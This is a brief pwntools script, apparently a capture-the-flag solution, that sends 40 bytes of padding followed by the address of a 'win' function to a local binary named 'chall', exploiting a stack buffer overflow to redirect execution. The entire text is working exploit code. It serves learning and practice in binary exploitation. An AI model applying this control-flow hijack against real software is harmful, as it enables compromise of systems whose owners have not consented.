from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

offset = 40

payload = b'a' * offset
payload += p64(elf.sym['win'])

io.sendlineafter(b'name?', str(len(payload)+2).encode())
io.sendlineafter(b'name?', payload)

io.interactive()

